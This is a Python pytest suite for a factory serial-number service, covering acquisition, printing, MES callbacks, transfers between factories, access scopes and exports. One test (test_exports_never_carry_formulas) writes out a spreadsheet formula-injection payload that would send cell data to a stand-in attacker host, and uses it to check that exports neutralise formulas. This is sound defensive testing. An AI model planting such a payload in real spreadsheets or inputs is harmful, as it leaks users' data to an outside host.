"""领取 / 打印 / 回调 / 转厂 / 查询范围。（对应 AcquireTransferIT）"""

import uuid

import pytest
from conftest import m, ok, q, uid

FA = "F-ACQ-A"
FB = "F-ACQ-B"
ORG_A = "领取测试甲厂"
ORG_B = "领取测试乙厂"


@pytest.fixture
def ctx(w, once):
    if "acq" not in once:
        w.factory(FA, ORG_A)
        w.factory(FB, ORG_B)
        once["acq"] = {
            "op_a": w.user(uid("opa"), "factory_operator", FA),
            "op_b": w.user(uid("opb"), "factory_operator", FB),
            "query": w.user(uid("qry"), "query", None),
        }
    return once["acq"]


def ready(w, prefix: str, a: int, b: int) -> str:
    """建 PI、订单（两种物料）并生成、分配到甲厂。"""
    pi, bill = uid("PI"), uid("MO")
    w.pi_rule(pi, prefix, 10, 5)
    w.order(bill, ORG_A, "C1", pi, ("MA", a), ("MB", b))
    w.generate(bill, a + b)
    w.allocate(bill)
    return pi


def req() -> str:
    return str(uuid.uuid4())


def test_acquire_by_whole_pi_is_idempotent_per_request_no(api, w, ctx, sql):
    op_a = ctx["op_a"]
    pi = ready(w, "K", 3, 2)
    segs = ok(api.get("/api/acquire/segments" + q(pi=pi), op_a))["items"]
    assert len(segs) == 2, "one row per material"
    r = req()
    b1 = ok(api.post("/api/open/acquire", m(pi=pi, request_no=r, page_size=2), op_a))
    assert b1["batch"]["qty"] == 5
    assert len(b1["items"]["items"]) == 2
    assert b1["items"]["total"] == 5
    batch = b1["batch"]["batch_no"]
    # 重试：同一批次、不改任何号
    b2 = ok(api.post("/api/open/acquire", m(pi=pi, request_no=r), op_a))
    assert b2["batch"]["batch_no"] == batch
    assert b2["batch"]["replayed"] is True
    assert api.post("/api/open/acquire", m(pi=pi, request_no=req()), op_a).code == "ACQ_NOTHING"
    assert api.post("/api/open/acquire", m(pi=uid("PI"), request_no=r), op_a).code == "ACQ_REQUEST_CONFLICT"
    items = ok(api.get(f"/api/open/batches/{batch}/items" + q(page=2, page_size=3), op_a))["items"]
    assert len(items) == 2
    assert items[0]["sn"] == "K00004"
    assert items[0]["seq_text"] == "00004"
    assert items[0]["seq_dec"] == 4
    assert (
        sql.count(
            "SELECT COUNT(*) FROM sn_audit WHERE action = 'SN_ACQUIRE' AND batch_no = %s AND source = 'API'", batch
        )
        == 1
    )


def test_batch_and_print_lists_filter_by_no_request_no_and_source(api, w, ctx):
    op_a = ctx["op_a"]
    pi = ready(w, "FL", 2, 0)
    r = req()
    batch = ok(api.post("/api/open/acquire", m(pi=pi, request_no=r), op_a))["batch"]["batch_no"]
    by_req = ok(api.get("/api/acquire/batches" + q(request_no=r), op_a))
    assert [b["batch_no"] for b in by_req["items"]] == [batch]
    assert ok(api.get("/api/acquire/batches" + q(batch_no=batch, source="API"), op_a))["total"] == 1
    assert ok(api.get("/api/acquire/batches" + q(batch_no=batch, source="PAGE"), op_a))["total"] == 0
    pr = req()
    printed = ok(api.post("/api/acquire/print", m(factory_code=FA, pi_no=pi, request_no=pr), op_a))
    by_no = ok(api.get("/api/acquire/prints" + q(print_no=printed.text("print_no")), op_a))
    assert [p["request_no"] for p in by_no["items"]] == [pr]
    assert ok(api.get("/api/acquire/prints" + q(pi=pi, request_no=req()), op_a))["total"] == 0


def test_factory_cannot_act_for_other_factory_but_admin_can(api, admin, w, ctx):
    op_a, op_b, qry = ctx["op_a"], ctx["op_b"], ctx["query"]
    pi = ready(w, "W", 2, 0)
    assert w.acquire(op_b, FA, pi, req()).code == "FACTORY_FORBIDDEN"
    assert w.acquire(op_b, None, pi, req()).code == "ACQ_NOTHING", "B's own factory has nothing"
    assert w.acquire(qry, FA, pi, req()).code == "FORBIDDEN"
    by_hq = ok(w.acquire(admin, FA, pi, req()))
    assert by_hq["qty"] == 2
    printed = ok(api.post("/api/acquire/print", m(factory_code=FA, pi_no=pi, request_no=req()), admin))
    assert printed["qty"] == 2
    f = api.get(f"/api/acquire/prints/{printed.text('print_no')}/file?format=csv", op_a)
    assert f.status == 200
    csv = f.raw.decode("utf-8")
    assert f"W00001,00001,1,{pi}" in csv, csv
    assert api.get(f"/api/acquire/prints/{printed.text('print_no')}/file", op_b).code == "FACTORY_FORBIDDEN"


def test_callback_only_touches_to_print_in_batch_and_lists_the_rest(api, w, ctx):
    op_a, op_b = ctx["op_a"], ctx["op_b"]
    pi = ready(w, "CB", 3, 2)
    batch = ok(api.post("/api/open/acquire", m(pi=pi, request_no=req()), op_a))["batch"]["batch_no"]
    # MB 两枚申请转厂 → 申请中
    ok(
        api.post(
            "/api/transfers",
            m(
                pi_no=pi,
                scope="MATERIAL",
                material_code="MB",
                to_factory=FB,
                to_pi=pi,
                target_source="MANUAL",
                reason="改厂",
            ),
            op_a,
        )
    )
    cb = ok(
        api.post(
            "/api/open/callback",
            m(
                batch_no=batch,
                target_status="PRINTED",
                ranges=[m(start_sn="CB00001", end_sn="CB00005")],
                sns=["NOT-EXIST"],
            ),
            op_a,
        )
    )
    assert cb["updated"] == 3
    skipped = cb["skipped"]
    assert len(skipped) == 3
    assert "APPLYING" in str(skipped)
    assert "NOT_IN_BATCH" in str(skipped)
    again = ok(api.post("/api/open/callback", m(batch_no=batch, target_status="PRINTED", sns=["CB00001"]), op_a))
    assert again["updated"] == 0
    assert again["already_printed"] == 1
    assert (
        api.post("/api/open/callback", m(batch_no=batch, target_status="TO_ACQUIRE", sns=["CB00001"]), op_a).code
        == "CALLBACK_STATUS_INVALID"
    )
    assert (
        api.post("/api/open/callback", m(batch_no=batch, target_status="PRINTED", sns=["CB00001"]), op_b).code
        == "FACTORY_FORBIDDEN"
    )
    # 领取页不再显示已打印；申请中的号不参与领取
    segs = ok(api.get("/api/acquire/segments" + q(pi=pi), op_a))["items"]
    assert len(segs) == 1
    assert segs[0]["status"] == "APPLYING"


def test_page_print_and_mes_callback_first_one_wins(api, w, ctx, sql):
    """页面打印与 MES 回调对等：谁先把待打印改成已打印谁生效，后到的不再改状态。"""
    op_a, op_b = ctx["op_a"], ctx["op_b"]
    pi = ready(w, "PC", 3, 2)
    batch = ok(api.post("/api/open/acquire", m(pi=pi, request_no=req()), op_a))["batch"]["batch_no"]
    # MES 部分回调 3 枚，页面打印只改剩下的 2 枚
    part = ok(
        api.post(
            "/api/open/callback",
            m(batch_no=batch, target_status="PRINTED", sns=["PC00001", "PC00002", "PC00003"]),
            op_a,
        )
    )
    assert part["updated"] == 3
    printed = ok(api.post("/api/acquire/print", m(factory_code=FA, pi_no=pi, request_no=req()), op_a))
    assert printed["qty"] == 2
    csv = api.get(f"/api/acquire/prints/{printed.text('print_no')}/file?format=csv", op_a).raw.decode("utf-8")
    assert "PC00004" in csv and "PC00005" in csv and "PC00001" not in csv
    # MES 再回调全部：页面已打掉的计入 already_printed
    full = ok(
        api.post(
            "/api/open/callback",
            m(batch_no=batch, target_status="PRINTED", ranges=[m(start_sn="PC00001", end_sn="PC00005")]),
            op_a,
        )
    )
    assert full["updated"] == 0
    assert full["already_printed"] == 5
    # 批次导出：整批 5 枚（含 MES 回调打的），格式同打印文件
    f = api.get(f"/api/acquire/batches/{batch}/file?format=csv", op_a)
    assert f.status == 200
    lines = [ln for ln in f.raw.decode("utf-8").splitlines() if ",PC0000" in ln]
    assert len(lines) == 5
    assert f"PC00001,00001,1,{pi}" in f.raw.decode("utf-8")
    assert api.get(f"/api/acquire/batches/{batch}/file", op_b).code == "FACTORY_FORBIDDEN"
    assert api.get("/api/acquire/batches/B-NOT-EXIST/file", op_a).code == "ACQ_BATCH_NOT_FOUND"


def test_after_mes_callback_page_can_only_export(api, w, ctx, sql):
    op_a = ctx["op_a"]
    pi = ready(w, "PE", 2, 1)
    batch = ok(api.post("/api/open/acquire", m(pi=pi, request_no=req()), op_a))["batch"]["batch_no"]
    ok(
        api.post(
            "/api/open/callback",
            m(batch_no=batch, target_status="PRINTED", ranges=[m(start_sn="PE00001", end_sn="PE00003")]),
            op_a,
        )
    )
    assert api.post("/api/acquire/print", m(factory_code=FA, pi_no=pi, request_no=req()), op_a).code == "PRINT_NOTHING"
    f = api.get(f"/api/acquire/batches/{batch}/file", op_a)
    assert f.status == 200
    assert (
        sql.count("SELECT COUNT(*) FROM sn_item WHERE batch_no = %s AND status = 'PRINTED' AND print_no IS NULL", batch)
        == 3
    )


def test_apply_withdraw_reject_restore_previous_status(api, admin, w, ctx, sql):
    op_a, op_b, qry = ctx["op_a"], ctx["op_b"], ctx["query"]
    pi = ready(w, "AW", 2, 2)
    ok(w.acquire(op_a, None, pi, req()))
    tid = ok(
        api.post(
            "/api/transfers",
            m(pi_no=pi, scope="PI", to_factory=FB, to_pi=pi, target_source="MANUAL", reason="整单转"),
            op_a,
        )
    )["id"]
    assert sql.count("SELECT COUNT(*) FROM sn_item WHERE pi_no = %s AND status = 'APPLYING'", pi) == 4
    assert (
        api.post("/api/transfers", m(pi_no=pi, scope="PI", to_factory=FB, to_pi=pi, reason="再申请"), op_a).code
        == "TR_NOTHING"
    ), "one open request per SN"
    assert api.post(f"/api/transfers/{tid}/withdraw", None, op_b).code == "TR_WITHDRAW_FORBIDDEN"
    ok(api.post(f"/api/transfers/{tid}/withdraw", None, op_a))
    assert sql.count("SELECT COUNT(*) FROM sn_item WHERE pi_no = %s AND status = 'TO_PRINT'", pi) == 4
    assert api.post(f"/api/transfers/{tid}/approve", None, admin).code == "TR_NOT_PENDING"

    tid2 = ok(
        api.post(
            "/api/transfers", m(pi_no=pi, scope="SINGLE", sn="AW00002", to_factory=FB, to_pi=pi, reason="单枚"), op_a
        )
    )["id"]
    ok(api.post(f"/api/transfers/{tid2}/reject", m(note="不同意"), admin))
    assert (
        sql.count(
            "SELECT COUNT(*) FROM sn_item WHERE sn = 'AW00002' AND pi_no = %s AND status = 'TO_PRINT' "
            "AND batch_no IS NOT NULL",
            pi,
        )
        == 1
    )
    assert (
        api.post("/api/transfers", m(pi_no=pi, scope="PI", to_factory=FB, to_pi=pi, reason=" "), op_a).code
        == "TR_REASON_REQUIRED"
    )
    assert (
        api.post("/api/transfers", m(pi_no=pi, scope="PI", to_factory=FB, to_pi=pi, reason="查询员不能申请"), qry).code
        == "FORBIDDEN"
    )


def test_approve_moves_to_target_keeps_serial_owner_and_source_count(api, admin, w, ctx, sql):
    op_a, op_b = ctx["op_a"], ctx["op_b"]
    pi = ready(w, "AP", 2, 2)
    to_pi = uid("PI")
    ok(w.acquire(op_a, None, pi, req()))
    ok(api.post("/api/acquire/print", m(pi_no=pi, request_no=req()), op_a))
    tid = ok(
        api.post(
            "/api/transfers",
            m(
                pi_no=pi,
                scope="MATERIAL",
                material_code="MA",
                to_factory=FB,
                to_customer="C9",
                to_pi=to_pi,
                to_material="",
                target_source="SNAPSHOT",
                reason="贸易转移",
            ),
            op_a,
        )
    )["id"]
    t = ok(api.post(f"/api/transfers/{tid}/approve", m(note="同意"), admin)).body
    assert t["status"] == "APPROVED"
    assert t["target_source"] == "MANUAL", "not in snapshot → manual"
    assert (
        sql.count(
            "SELECT COUNT(*) FROM sn_item WHERE pi_no = %s AND factory_code = %s AND status = 'TO_ACQUIRE' "
            "AND customer_code = 'C9' AND material_code = 'MA' AND seq_pi_no = %s AND batch_no IS NULL",
            to_pi,
            FB,
            pi,
        )
        == 2
    )
    assert sql.count("SELECT COUNT(*) FROM sn_key WHERE pi_no = %s AND seq_pi_no = %s", to_pi, pi) == 2
    assert sql.count("SELECT COALESCE(MAX(last_seq_dec), 0) FROM sn_pi_counter WHERE pi_no = %s", to_pi) == 0, (
        "target counter not raised"
    )
    assert sql.count("SELECT generated_qty FROM sn_bill_gen WHERE pi_no = %s", pi) == 4, "still counted at source"
    # 转出厂仍能在记录里查到，标为已转出；转入厂可按正常流程领取
    items = ok(api.get(f"/api/transfers/{tid}/items", op_a))["items"]
    assert items[0]["current_status"] == "TRANSFERRED_OUT"
    assert ok(api.get("/api/transfers" + q(pi=pi), op_a))["items"][0]["direction"] == "OUT"
    w.order(uid("MO"), ORG_B, "C9", to_pi, ("MA", 1))
    assert ok(w.acquire(op_b, None, to_pi, req()))["qty"] == 2


def test_direct_transfer_rejects_duplicate_in_target_pi(api, admin, w, ctx, sql):
    pi1 = ready(w, "DU", 3, 0)
    pi2, bill2 = uid("PI"), uid("MO")
    w.pi_rule(pi2, "DU", 10, 5)
    w.order(bill2, ORG_A, "C1", pi2, ("MA", 3))
    w.generate(bill2, 2)
    w.allocate(bill2)
    dup = api.post(
        "/api/transfers/direct",
        m(factory_code=FA, pi_no=pi1, scope="PI", to_factory=FA, to_pi=pi2, reason="合并"),
        admin,
    )
    assert dup.code == "TR_DUPLICATE"
    assert sql.count("SELECT COUNT(*) FROM sn_item WHERE pi_no = %s AND status = 'TO_ACQUIRE'", pi1) == 3, (
        "whole transfer rejected"
    )
    assert (
        api.post(
            "/api/transfers/direct",
            m(factory_code=FA, pi_no=pi1, scope="PI", to_factory=FA, to_pi=pi1, reason="同目标"),
            admin,
        ).code
        == "TR_SAME_TARGET"
    )
    assert (
        api.post(
            "/api/transfers/direct",
            m(factory_code=FA, pi_no=pi1, scope="PI", to_factory="NOPE", to_pi=pi1, reason="x"),
            admin,
        ).code
        == "FACTORY_NOT_FOUND"
    )


def test_pending_alloc_cannot_be_transferred(api, admin, w, ctx):
    pi, bill = uid("PI"), uid("MO")
    w.pi_rule(pi, "PA", 10, 5)
    w.order(bill, ORG_A, "C1", pi, ("MA", 2))
    w.generate(bill, 2)
    assert (
        api.post(
            "/api/transfers/direct",
            m(factory_code=FA, pi_no=pi, scope="SINGLE", sn="PA00001", to_factory=FB, to_pi=pi, reason="x"),
            admin,
        ).code
        == "TR_NOTHING"
    )


def test_read_scopes(api, admin, w, ctx):
    op_a, op_b, qry = ctx["op_a"], ctx["op_b"], ctx["query"]
    pi = ready(w, "RS", 2, 0)
    # 乙厂也有一枚该 PI 的号
    ok(
        api.post(
            "/api/transfers/direct",
            m(factory_code=FA, pi_no=pi, scope="SINGLE", sn="RS00002", to_factory=FB, to_pi=pi, reason="分一枚"),
            admin,
        )
    )
    assert ok(api.get("/api/sn" + q(pi=pi), op_a))["total"] == 1, "own factory by default"
    assert api.get("/api/sn" + q(pi=pi, factory_code=FB), op_a).code == "FACTORY_FORBIDDEN"
    assert ok(api.get("/api/sn" + q(pi=pi, pi_all=True), op_a))["total"] == 2, "read-only all factories"
    assert api.get("/api/sn" + q(pi_all=True), op_a).code == "QUERY_PI_REQUIRED"
    assert api.get("/api/sn" + q(pi=uid("PI"), pi_all=True), op_a).code == "QUERY_PI_NOT_OWNED"
    assert ok(api.get("/api/sn" + q(pi=pi), qry))["total"] == 2, "unbound query sees all"
    bound_query = w.user(uid("qb"), "query", FB)
    assert ok(api.get("/api/sn" + q(pi=pi), bound_query))["total"] == 1
    export = api.get("/api/sn/export" + q(pi=pi, format="csv"), qry)
    assert export.status == 200
    assert "RS00002" in export.raw.decode("utf-8")
    assert ok(api.get("/api/audits" + q(pi=pi), op_b))["total"] >= 1


def test_failed_write_is_audited(api, w, ctx, sql):
    pi = uid("PI")
    assert w.acquire(ctx["op_a"], None, pi, req()).code == "ACQ_PI_NOT_IN_ERP"
    assert (
        sql.count("SELECT COUNT(*) FROM sn_audit WHERE action = 'SN_ACQUIRE' AND result = 'FAIL' AND pi_no = %s", pi)
        == 1
    )


def test_xlsx_exports_open_with_headers_and_rows(api, admin, w, ctx):
    import io

    from openpyxl import load_workbook

    pi = ready(w, "XL", 2, 1)
    ok(w.acquire(admin, FA, pi, req()))
    printed = ok(api.post("/api/acquire/print", m(factory_code=FA, pi_no=pi, request_no=req()), admin))
    for path in (
        f"/api/sn/export{q(pi=pi, format='xlsx')}",
        f"/api/acquire/prints/{printed.text('print_no')}/file",
        f"/api/audits/export{q(pi=pi)}",
    ):
        r = api.get(path, admin)
        assert r.status == 200, path
        ws = load_workbook(io.BytesIO(r.raw), read_only=True).worksheets[0]
        rows = list(ws.iter_rows(values_only=True))
        assert len(rows) >= 2, path
        if "audits" not in path:
            assert rows[0][:2] == ("序号", "完整SN")
            assert rows[1][1] == "XL00001" and rows[1][3] == 1


def test_over_long_value_is_validation_error_not_retry_conflict(api, admin, ctx):
    r = api.post(
        "/api/transfers/direct",
        m(factory_code=FA, pi_no=uid("PI"), scope="PI", to_factory=FB, to_pi="T" * 80, reason="r"),
        admin,
    )
    assert r.status == 422 and r.code == "VALIDATION", str(r)


def test_exports_never_carry_formulas(api, admin, w, ctx):
    import io

    import openpyxl

    pi = ready(w, "X", 2, 0)
    evil = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
    ok(api.post("/api/transfers", m(pi_no=pi, scope="PI", to_factory=FB, to_pi=pi, reason=evil), ctx["op_a"]))
    path = "/api/audits/export" + q(action="TRANSFER_APPLY", pi=pi)
    headers = {"Authorization": "Bearer " + admin}
    ws = openpyxl.load_workbook(io.BytesIO(api.client.get(path + "&format=xlsx", headers=headers).content)).active
    cells = [c for row in ws.iter_rows(min_row=2) for c in row if c.value == evil]
    assert cells, "reason kept verbatim"
    assert all(c.data_type == "s" for c in cells)
    csv = api.client.get(path + "&format=csv", headers=headers).content.decode("utf-8-sig")
    assert "\"'=HYPERLINK(" in csv


def test_concurrent_print_with_same_request_no_replays_one_print(api, admin, w, ctx, sql):
    from concurrent.futures import ThreadPoolExecutor

    for _ in range(3):
        pi = ready(w, "N", 1500, 500)
        ok(w.acquire(admin, FA, pi, req()))
        r = req()
        body = m(factory_code=FA, pi_no=pi, request_no=r)
        with ThreadPoolExecutor(4) as ex:
            out = list(ex.map(lambda b: api.post("/api/acquire/print", b, admin), [body] * 4))
        assert all(o.status == 200 for o in out), [str(o) for o in out]
        assert len({o.text("print_no") for o in out}) == 1
        assert sum(1 for o in out if o["replayed"] is False) == 1
        assert sql.count("SELECT COUNT(*) FROM sn_print WHERE factory_code = %s AND request_no = %s", FA, r) == 1
